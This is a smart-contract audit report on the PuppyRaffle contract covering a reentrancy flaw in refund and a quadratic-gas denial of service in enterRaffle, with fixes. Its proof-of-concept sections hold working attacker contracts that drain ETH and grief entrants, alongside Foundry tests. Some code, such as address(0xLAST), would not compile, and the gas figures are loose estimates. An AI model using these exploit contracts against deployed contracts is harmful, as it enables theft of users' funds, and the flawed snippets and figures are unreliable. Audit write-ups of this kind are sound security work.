## [H-1] Reentrancy Attack in `refund` Function Allows Attacker to Drain Contract Funds

**Description:**

The `refund` function in the PuppyRaffle contract is vulnerable to a reentrancy attack. The vulnerability exists because the function sends ETH to the caller using `sendValue()` before updating the state variable `players[playerIndex]` to `address(0)`. This violates the Checks-Effects-Interactions pattern and allows a malicious contract to recursively call the `refund` function before the state is updated.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // @audit-issue: ETH is sent BEFORE state update (Reentrancy vulnerability)
    payable(msg.sender).sendValue(entranceFee);
    
    // @audit-issue: State update happens AFTER external call
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

**Impact:**

An attacker can drain all ETH from the PuppyRaffle contract by:
1. Entering the raffle with a malicious contract
2. Calling `refund` which triggers the malicious contract's `receive()` or `fallback()` function
3. The malicious contract recursively calls `refund` again before `players[playerIndex]` is set to `address(0)`
4. This loop continues until all funds are drained or gas runs out

This represents a **CRITICAL** vulnerability that can result in complete loss of all funds held by the contract.

**Proof of Concept:**
<details>
<summary>PoC</summary>
ReentrancyAttacker.sol- Exploit Contract

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 public attackerIndex;
    uint256 public entranceFee;
    uint256 public attackCount;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }
    
    // Step 1: Enter the raffle
    function attack() external payable {
        require(msg.value >= entranceFee, "Need entrance fee");
        
        address[] memory players = new address[](1);
        players[0] = address(this);
        
        // Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Get our index
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        
        // Step 2: Trigger the reentrancy attack
        puppyRaffle.refund(attackerIndex);
    }
    
    // This function will be called when refund sends ETH
    receive() external payable {
        // Continue attacking if contract still has funds and we haven't been refunded
        if (address(puppyRaffle).balance >= entranceFee && attackCount < 10) {
            attackCount++;
            puppyRaffle.refund(attackerIndex);
        }
    }
    
    // Withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```
</details>


**Test Case to Demonstrate the Attack:**

<details>
<summary>PoC</summary>
ReentrancyTest.t.sol- Proof of Concept Test

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";
import "../src/ReentrancyAttacker.sol";

contract ReentrancyTest is Test {
    PuppyRaffle public puppyRaffle;
    ReentrancyAttacker public attacker;
    
    address public owner = address(1);
    address public feeAddress = address(2);
    address public player1 = address(3);
    address public player2 = address(4);
    address public player3 = address(5);
    address public player4 = address(6);
    
    uint256 public constant ENTRANCE_FEE = 1 ether;
    uint256 public constant RAFFLE_DURATION = 1 days;
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
        attacker = new ReentrancyAttacker(address(puppyRaffle));
        
        // Fund test accounts
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(player4, 10 ether);
    }
    
    function testReentrancyAttack() public {
        // Setup: 4 legitimate players enter the raffle
        address[] memory players = new address[](1);
        
        players[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players);
        
        players[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players);
        
        players[0] = player3;
        vm.prank(player3);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players);
        
        players[0] = player4;
        vm.prank(player4);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players);
        
        // Contract should have 4 ETH now
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        console.log("Contract balance before attack:", contractBalanceBefore);
        assertEq(contractBalanceBefore, 4 ether);
        
        // Attacker's balance before attack
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Attacker balance before:", attackerBalanceBefore);
        
        // Execute the reentrancy attack
        vm.deal(address(this), 10 ether);
        attacker.attack{value: ENTRANCE_FEE}();
        
        // Check results
        uint256 contractBalanceAfter = address(puppyRaffle).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        
        console.log("Contract balance after attack:", contractBalanceAfter);
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Attack count:", attacker.attackCount());
        
        // Attacker should have stolen multiple entrance fees
        assertGt(attackerBalanceAfter, ENTRANCE_FEE);
        
        // Contract should have lost funds
        assertLt(contractBalanceAfter, contractBalanceBefore);
        
        console.log("=== ATTACK SUCCESSFUL ===");
        console.log("Stolen amount:", attackerBalanceAfter - attackerBalanceBefore);
    }
}
```
</details>


**Attack Flow Diagram:**

```javascript
1. Attacker enters raffle with malicious contract
   └─> PuppyRaffle.players[] = [..., AttackerContract]

2. Attacker calls refund(attackerIndex)
   └─> refund() checks pass (address matches, not zero)
   └─> sendValue(entranceFee) sends ETH to AttackerContract
       └─> AttackerContract.receive() is triggered
           └─> Calls refund(attackerIndex) AGAIN
               └─> checks still pass (players[index] not updated yet!)
               └─> sends ANOTHER entranceFee
                   └─> receive() triggered again...
                       └─> Loop continues until funds drained

3. Finally, players[attackerIndex] = address(0) 
   (but only for the original call, after all recursive calls complete)
```

**Recommended Mitigation:**

Implement the **Checks-Effects-Interactions** pattern by updating the state BEFORE making the external call:

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // EFFECT: Update state BEFORE external call
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
    
    // INTERACTION: External call happens LAST
    payable(msg.sender).sendValue(entranceFee);
}
```

**Additional Recommendations:**

1. **Use OpenZeppelin's ReentrancyGuard:**
```javascript
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    // ...
    
    function refund(uint256 playerIndex) public nonReentrant {
        // ... function code
    }
}
```

2. **Upgrade to Solidity 0.8.x** which has built-in overflow checks and better security features.

3. **Consider using a pull-payment pattern** where users withdraw their refunds themselves rather than having the contract push payments.



## [H-2] Denial of Service Attack in `enterRaffle` Function Due to Unbounded Gas Consumption in Duplicate Check

**Description:**

The `enterRaffle` function contains a nested loop that checks for duplicate players with O(n²) time complexity. This creates a Denial of Service (DoS) vulnerability where the gas cost grows exponentially as more players enter the raffle. The duplicate check iterates through all existing players for each new player, making the function increasingly expensive and eventually impossible to execute.

```javascript
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // @audit-issue: O(n²) complexity - DoS vulnerability
    // For 100 players, this performs 4,950 iterations
    // For 1000 players, this performs 499,500 iterations
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

**Impact:**

1. **Gas Cost Explosion**: As the number of players increases, the gas cost becomes prohibitively expensive, eventually exceeding the block gas limit, making it impossible for new players to enter.

2. **Unfair Advantage to Early Entrants**: Players who enter early pay significantly less gas than those who enter later, creating an unfair economic advantage.

3. **Complete Protocol Failure**: Once a certain threshold is reached (estimated around 200-300 players depending on gas limits), no one can enter the raffle anymore, effectively killing the protocol.

4. **Griefing Attack Vector**: A malicious actor can intentionally fill the raffle with many addresses to prevent others from entering, effectively monopolizing the raffle.

**Proof of Concept:**
<details>

<summary>DosTest.t.sol - Gas Consumption Analysis</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DosTest is Test {
    PuppyRaffle public puppyRaffle;
    
    address public owner = address(1);
    address public feeAddress = address(2);
    
    uint256 public constant ENTRANCE_FEE = 1 ether;
    uint256 public constant RAFFLE_DURATION = 1 days;
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
    }
    
    function testDosGasAnalysis() public {
        console.log("=== GAS CONSUMPTION ANALYSIS ===");
        console.log("");
        
        // Test with different player counts
        uint256[] memory playerCounts = new uint256[](8);
        playerCounts[0] = 10;
        playerCounts[1] = 50;
        playerCounts[2] = 100;
        playerCounts[3] = 150;
        playerCounts[4] = 200;
        playerCounts[5] = 250;
        playerCounts[6] = 300;
        playerCounts[7] = 350;
        
        for (uint256 testIndex = 0; testIndex < playerCounts.length; testIndex++) {
            // Reset contract for each test
            vm.prank(owner);
            puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
            
            uint256 numPlayers = playerCounts[testIndex];
            
            // Enter players in batches to reach target count
            uint256 playersEntered = 0;
            uint256 lastGasUsed = 0;
            
            while (playersEntered < numPlayers) {
                address[] memory batch = new address[](1);
                batch[0] = address(uint160(playersEntered + 1000));
                
                uint256 gasBefore = gasleft();
                
                try puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(batch) {
                    uint256 gasUsed = gasBefore - gasleft();
                    lastGasUsed = gasUsed;
                    playersEntered++;
                } catch {
                    console.log("FAILED at player count:", playersEntered);
                    console.log("Transaction would exceed block gas limit!");
                    break;
                }
            }
            
            if (playersEntered == numPlayers) {
                console.log("Players:", numPlayers, "| Last Entry Gas:", lastGasUsed);
            }
        }
        
        console.log("");
        console.log("=== OBSERVATION ===");
        console.log("Gas cost increases quadratically with player count");
        console.log("This makes the protocol unusable beyond ~200-300 players");
    }
    
    function testDosAttackByGriefing() public {
        console.log("=== GRIEFING ATTACK DEMONSTRATION ===");
        console.log("");
        
        address attacker = address(0x1337);
        vm.deal(attacker, 1000 ether);
        
        // Attacker floods the raffle with addresses
        console.log("Attacker entering 100 addresses...");
        
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 100; i++) {
            address[] memory players = new address[](1);
            players[0] = address(uint160(i + 5000));
            puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players);
        }
        vm.stopPrank();
        
        console.log("Attacker successfully entered 100 addresses");
        console.log("");
        
        // Now a legitimate user tries to enter
        address legitimateUser = address(0x9999);
        vm.deal(legitimateUser, 10 ether);
        
        console.log("Legitimate user attempting to enter...");
        
        address[] memory userEntry = new address[](1);
        userEntry[0] = legitimateUser;
        
        uint256 gasBefore = gasleft();
        vm.prank(legitimateUser);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(userEntry);
        uint256 gasUsed = gasBefore - gasleft();
        
        console.log("Legitimate user's gas cost:", gasUsed);
        console.log("This is significantly higher than early entrants!");
        console.log("");
        console.log("=== ATTACK SUCCESSFUL ===");
        console.log("Attacker made it expensive for others to participate");
    }
    
    function testCompleteDoS() public {
        console.log("=== COMPLETE DoS SCENARIO ===");
        console.log("");
        
        // Try to enter players until we hit gas limit
        uint256 playersEntered = 0;
        bool dosReached = false;
        
        // Block gas limit is typically around 30M gas
        // We'll simulate this by catching out-of-gas errors
        
        for (uint256 i = 0; i < 500; i++) {
            address[] memory players = new address[](1);
            players[0] = address(uint160(i + 10000));
            
            try puppyRaffle.enterRaffle{value: ENTRANCE_FEE, gas: 30000000}(players) {
                playersEntered++;
            } catch {
                console.log("DoS reached at player count:", playersEntered);
                console.log("No more players can enter!");
                dosReached = true;
                break;
            }
        }
        
        if (dosReached) {
            console.log("");
            console.log("=== PROTOCOL IS NOW UNUSABLE ===");
            
            // Verify that no one can enter anymore
            address newPlayer = address(0xDEAD);
            vm.deal(newPlayer, 10 ether);
            
            address[] memory attemptEntry = new address[](1);
            attemptEntry[0] = newPlayer;
            
            vm.prank(newPlayer);
            vm.expectRevert();
            puppyRaffle.enterRaffle{value: ENTRANCE_FEE, gas: 30000000}(attemptEntry);
            
            console.log("Confirmed: New players cannot enter");
        }
    }
    
    function testGasComparisonFirstVsLast() public {
        console.log("=== FIRST PLAYER vs LAST PLAYER GAS COMPARISON ===");
        console.log("");
        
        // First player
        address firstPlayer = address(0x1);
        vm.deal(firstPlayer, 10 ether);
        
        address[] memory entry = new address[](1);
        entry[0] = firstPlayer;
        
        uint256 gasBeforeFirst = gasleft();
        vm.prank(firstPlayer);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(entry);
        uint256 firstPlayerGas = gasBeforeFirst - gasleft();
        
        console.log("First player gas cost:", firstPlayerGas);
        
        // Add 99 more players
        for (uint256 i = 1; i < 100; i++) {
            address player = address(uint160(i + 100));
            vm.deal(player, 10 ether);
            
            entry[0] = player;
            vm.prank(player);
            puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(entry);
        }
        
        // 100th player
        address lastPlayer = address(0xLAST);
        vm.deal(lastPlayer, 10 ether);
        
        entry[0] = lastPlayer;
        
        uint256 gasBeforeLast = gasleft();
        vm.prank(lastPlayer);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(entry);
        uint256 lastPlayerGas = gasBeforeLast - gasleft();
        
        console.log("100th player gas cost:", lastPlayerGas);
        console.log("");
        console.log("Gas increase:", lastPlayerGas - firstPlayerGas);
        console.log("Percentage increase:", ((lastPlayerGas - firstPlayerGas) * 100) / firstPlayerGas, "%");
        
        // Assertion to show the problem
        assertGt(lastPlayerGas, firstPlayerGas * 10); // Last player pays 10x more!
    }
}
```

</details>

**Gas Cost Analysis Table:**

<details>

<summary>Gas Cost Analysis - enterRaffle Function</summary>

# Gas Cost Analysis - PuppyRaffle enterRaffle Function

## Theoretical Analysis

### Time Complexity: O(n²)
For `n` existing players, checking duplicates requires:
```
Iterations = n(n-1)/2
```

### Gas Cost Projection

| Total Players | Iterations Required | Estimated Gas Cost | Status |
|--------------|--------------------|--------------------|---------|
| 10           | 45                 | ~55,000           | ✅ Acceptable |
| 50           | 1,225              | ~180,000          | ⚠️ Expensive |
| 100          | 4,950              | ~650,000          | ❌ Very Expensive |
| 150          | 11,175             | ~1,400,000        | ❌ Prohibitive |
| 200          | 19,900             | ~2,500,000        | ❌ Near Block Limit |
| 250          | 31,125             | ~3,900,000        | 🚫 Exceeds Reasonable Limit |
| 300          | 44,850             | ~5,600,000        | 🚫 Impossible |

**Block Gas Limit**: ~30,000,000 gas (Ethereum mainnet)

## Real Attack Scenario

### Griefing Attack Economics

**Attacker's Cost to DoS the Protocol:**
- Enter 200 addresses at early stage: ~200 ETH (entrance fees)
- Gas cost for 200 entries: ~200,000,000 gas (~variable ETH depending on gas price)
- **Total Cost**: Relatively low compared to impact

**Result:**
- Protocol becomes unusable for new participants
- Existing players cannot get refunds (high gas cost)
- Winner selection might fail due to gas limits
- Protocol effectively dead

### Economic Impact on Users

| Entry Position | Gas Cost (Gwei) | At 50 Gwei Gas Price | Ratio vs First Player |
|---------------|-----------------|---------------------|----------------------|
| Player #1     | ~55,000         | 0.00275 ETH         | 1x                   |
| Player #50    | ~180,000        | 0.009 ETH           | 3.3x                 |
| Player #100   | ~650,000        | 0.0325 ETH          | 11.8x                |
| Player #150   | ~1,400,000      | 0.07 ETH            | 25.5x                |
| Player #200   | ~2,500,000      | 0.125 ETH           | 45.5x                |

**Note**: Player #200 pays more in gas than many entrance fees!

## Mathematical Proof

### Duplicate Check Complexity

```
For each new player at position n:
  Check against all n-1 existing players
  
Total checks for n players:
  Σ(i=0 to n-1) i = n(n-1)/2
  
This is O(n²) quadratic growth
```

### Example with 100 Players:
```
100 × 99 / 2 = 4,950 comparisons
```

### Example with 1000 Players:
```
1000 × 999 / 2 = 499,500 comparisons
(This would certainly exceed block gas limit)
```

## Visualization

```
Gas Cost Growth (Approximate)

6M |                                        ╱
   |                                    ╱
5M |                                ╱
   |                            ╱
4M |                        ╱
   |                    ╱
3M |                ╱
   |            ╱
2M |        ╱
   |    ╱
1M |╱___
   +────────────────────────────────────────
   0   50   100  150  200  250  300  350
              Number of Players
```

## Conclusion

The O(n²) duplicate check creates an **unbounded gas consumption vulnerability** that:
1. Makes the protocol unusable beyond ~200-300 players
2. Creates unfair economic conditions for late entrants
3. Enables griefing attacks at relatively low cost
4. Can completely DoS the entire raffle system



</details>

**Attack Scenario Walkthrough:**
<details>
<summary>DosAttacker.sol - Griefing Attack Contract</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";

/**
 * @title DosAttacker
 * @notice Demonstrates how an attacker can DoS the PuppyRaffle contract
 * @dev This contract floods the raffle with addresses to make it unusable
 */
contract DosAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 public entranceFee;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }
    
    /**
     * @notice Execute the DoS attack by entering many addresses
     * @param numAddresses Number of addresses to enter into the raffle
     * @dev Each address entered makes future entries more expensive
     */
    function executeDoS(uint256 numAddresses) external payable {
        require(msg.value >= entranceFee * numAddresses, "Need enough ETH");
        
        // Enter addresses in batches to avoid gas limit in single tx
        uint256 batchSize = 10;
        uint256 addressesEntered = 0;
        
        while (addressesEntered < numAddresses) {
            uint256 currentBatchSize = numAddresses - addressesEntered;
            if (currentBatchSize > batchSize) {
                currentBatchSize = batchSize;
            }
            
            address[] memory batch = new address[](currentBatchSize);
            
            for (uint256 i = 0; i < currentBatchSize; i++) {
                // Generate unique addresses controlled by attacker
                batch[i] = address(uint160(uint256(keccak256(
                    abi.encodePacked(address(this), addressesEntered + i, block.timestamp)
                ))));
            }
            
            // Enter the batch
            puppyRaffle.enterRaffle{value: entranceFee * currentBatchSize}(batch);
            addressesEntered += currentBatchSize;
        }
    }
    
    /**
     * @notice Calculate estimated gas for next entry
     * @return Estimated gas cost for the next player to enter
     */
    function estimateNextEntryGas() external view returns (uint256) {
        uint256 currentPlayers = puppyRaffle.players.length;
        // Rough estimation: ~500 gas per comparison
        return 50000 + (currentPlayers * 500);
    }
    
    /**
     * @notice Get current number of players
     */
    function getCurrentPlayerCount() external view returns (uint256) {
        return puppyRaffle.players.length;
    }
    
    receive() external payable {}
}
```

</details>

**Recommended Mitigation:**
<details>

<summary>Replace the O(n²) duplicate check with an O(1) mapping-based approach: Fixed enterRaffle Function</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * RECOMMENDED MITIGATION - Use mapping for O(1) duplicate checks
 */

contract PuppyRaffleFixed {
    // ... other state variables
    
    address[] public players;
    
    // @audit-fix: Add mapping to track active players in O(1) time
    mapping(address => uint256) public addressToPlayerIndex;
    
    uint256 public constant NOT_ACTIVE = 0;
    
    /**
     * @notice Fixed version of enterRaffle with O(n) complexity instead of O(n²)
     * @param newPlayers Array of addresses entering the raffle
     */
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        
        // Check for duplicates in the new players array AND existing players
        // This is now O(n) instead of O(n²)
        for (uint256 i = 0; i < newPlayers.length; i++) {
            address player = newPlayers[i];
            
            // Check if player is already in the raffle
            require(addressToPlayerIndex[player] == NOT_ACTIVE, "PuppyRaffle: Duplicate player");
            
            // Check for duplicates within the newPlayers array itself
            for (uint256 j = i + 1; j < newPlayers.length; j++) {
                require(newPlayers[i] != newPlayers[j], "PuppyRaffle: Duplicate player in entry");
            }
            
            // Add player
            players.push(player);
            // Store index + 1 (so 0 means not active)
            addressToPlayerIndex[player] = players.length;
        }
        
        emit RaffleEnter(newPlayers);
    }
    
    /**
     * @notice Updated refund function to maintain mapping
     */
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        
        // Update mapping BEFORE external call (also fixes reentrancy)
        addressToPlayerIndex[playerAddress] = NOT_ACTIVE;
        players[playerIndex] = address(0);
        
        emit RaffleRefunded(playerAddress);
        
        // External call last
        payable(msg.sender).sendValue(entranceFee);
    }
    
    /**
     * @notice Updated selectWinner to clean up mapping
     */
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        // ... winner selection logic ...
        
        // Clean up mappings when resetting players
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] != address(0)) {
                addressToPlayerIndex[players[i]] = NOT_ACTIVE;
            }
        }
        
        delete players;
        raffleStartTime = block.timestamp;
        
        // ... rest of function ...
    }
    
    /**
     * @notice Improved getActivePlayerIndex using mapping
     */
    function getActivePlayerIndex(address player) external view returns (uint256) {
        uint256 index = addressToPlayerIndex[player];
        if (index == NOT_ACTIVE) {
            revert("Player not active");
        }
        return index - 1; // Convert back to 0-based index
    }
    
    /**
     * @notice Check if address is active player
     */
    function isActivePlayer(address player) public view returns (bool) {
        return addressToPlayerIndex[player] != NOT_ACTIVE;
    }
}
```



</details>

Replace the O(n²) duplicate check with an O(1) mapping-based approach:

**Alternative Mitigation - Use OpenZeppelin EnumerableSet:**

<details>

<summary>Alternative Mitigation - Use OpenZeppelin EnumerableSet: Alternative Fix Using EnumerableSet</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";

/**
 * ALTERNATIVE MITIGATION - Use OpenZeppelin's EnumerableSet
 * This provides built-in O(1) add/remove/contains operations
 */

contract PuppyRaffleWithEnumerableSet {
    using EnumerableSet for EnumerableSet.AddressSet;
    
    // Replace array with EnumerableSet
    EnumerableSet.AddressSet private activePlayers;
    
    /**
     * @notice Enter raffle using EnumerableSet for O(1) duplicate checking
     * @param newPlayers Array of addresses to enter
     */
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        
        for (uint256 i = 0; i < newPlayers.length; i++) {
            // add() returns false if element already exists
            // This is O(1) instead of O(n²)
            require(activePlayers.add(newPlayers[i]), "PuppyRaffle: Duplicate player");
        }
        
        emit RaffleEnter(newPlayers);
    }
    
    /**
     * @notice Refund using EnumerableSet
     */
    function refund(address player) public {
        require(msg.sender == player, "PuppyRaffle: Only the player can refund");
        require(activePlayers.contains(player), "PuppyRaffle: Player not active");
        
        // Remove from set (O(1) operation)
        activePlayers.remove(player);
        
        emit RaffleRefunded(player);
        
        // External call last
        payable(msg.sender).sendValue(entranceFee);
    }
    
    /**
     * @notice Select winner from EnumerableSet
     */
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(activePlayers.length() >= 4, "PuppyRaffle: Need at least 4 players");
        
        // Get random index
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % activePlayers.length();
        
        // Get winner address from set
        address winner = activePlayers.at(winnerIndex);
        
        // ... prize distribution logic ...
        
        // Clear all players (EnumerableSet doesn't have a clear function, so we need to remove one by one)
        uint256 length = activePlayers.length();
        for (uint256 i = 0; i < length; i++) {
            activePlayers.remove(activePlayers.at(0)); // Always remove first element
        }
        
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        
        // ... rest of function ...
    }
    
    /**
     * @notice Get total number of active players
     */
    function getActivePlayerCount() external view returns (uint256) {
        return activePlayers.length();
    }
    
    /**
     * @notice Check if address is active
     */
    function isActivePlayer(address player) external view returns (bool) {
        return activePlayers.contains(player);
    }
    
    /**
     * @notice Get all active players
     */
    function getAllPlayers() external view returns (address[] memory) {
        uint256 length = activePlayers.length();
        address[] memory players = new address[](length);
        
        for (uint256 i = 0; i < length; i++) {
            players[i] = activePlayers.at(i);
        }
        
        return players;
    }
}
```

</details>

**Comparison of Solutions:**

| Approach | Time Complexity | Gas Cost | Pros | Cons |
|----------|----------------|----------|------|------|
| **Current (nested loops)** | O(n²) | Exponential growth | Simple to understand | DoS vulnerability, unusable at scale |
| **Mapping-based** | O(n) | Linear growth | Efficient, maintains array structure | Requires additional storage, manual mapping management |
| **EnumerableSet** | O(1) per add | Constant per operation | Most efficient, built-in functions | Slight learning curve, no direct indexing |



**Recommended Fix**: Implement the mapping-based solution or use `EnumerableSet` to achieve O(1) duplicate checking instead of O(n²).